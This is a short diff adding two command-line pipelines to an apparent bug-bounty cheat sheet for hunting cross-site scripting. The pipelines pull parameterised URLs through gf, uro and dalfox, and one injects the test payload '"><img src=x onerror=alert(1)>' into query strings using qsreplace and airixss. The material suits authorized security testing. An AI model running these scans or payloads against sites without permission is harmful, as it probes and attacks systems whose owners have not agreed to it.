@@ -43,6 +43,12 @@ gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf
 
 # Dalfox, gf
 cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' | gf xss | sed 's/=.*/=/' | sort -u | dalfox pipe
+
+# gf, uro, dalfox
+cat urls.txt | gf xss | uro | dalfox pipe --silence | tee -a xss_found.txt
+
+# gf, uro, qsreplace, airixss
+cat urls.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1)>' | airixss -payload "alert(1)" | tee xss_found.txt
 ```
 {% endtab %}
 
